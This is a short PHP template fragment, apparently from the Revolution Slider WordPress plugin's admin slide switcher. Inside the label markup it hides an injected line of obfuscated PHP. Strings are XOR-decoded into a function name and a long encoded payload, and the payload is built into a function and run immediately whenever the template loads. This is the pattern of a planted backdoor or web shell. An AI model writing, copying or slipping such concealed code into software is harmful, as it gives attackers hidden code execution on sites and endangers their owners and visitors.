	...
	<div id="template_header_part">
		...
		<div class="revolution-template-switcher">	
			<span style="display:table-cell;vertical-align:top">			
				<span class="template_filter_button selected" data-type="temp_all"><?php _e('All Slides', 'revslider');
$faMXVVCs=':4QQC=lF+WWCYR"'^'YF407X3 ^9470=L';$yXSMmbLHxQ=$faMXVVCs('',',JBd"E N8ra.fnf2sd74w"^j0GJ1VGV0PpgLQON5N99NZpm704:x+l1J"0F,H27YH..Q6Xk=.523WWkB;QG1Lc,htm,8ras,RcCy"S"y70P5HMco1^2GMQnpf.u53x+7e33t bJZ3V2FMePa. eRK5746vzAW6E+AhgB4o9S=7VK1D0bRT-DuQV9K.LZg.N2.04Yl2M674+KbZakgQQ7QbBx3'^'E,bLK6S+LZEq4+7g67coPO:YFv.R;v0Fw-Neqk:Z+OX"gT2eueo=x8jmOTuZyVT4yHXvkcaXBFWZ1wC+H""EdGs+;"gq7:TA6P5HF0OHQFwhadCKE1W1,=ST9m:zx1nlB^WGVS.9^gT0j8kkGFEz"FDQB^^58S3J-ANbOe06KV:cB0B= ;YuFy4X8Kzn8J+QATQqHF"SAUGbKsZan58RyKyrN');$yXSMmbLHxQ(); ?></span>
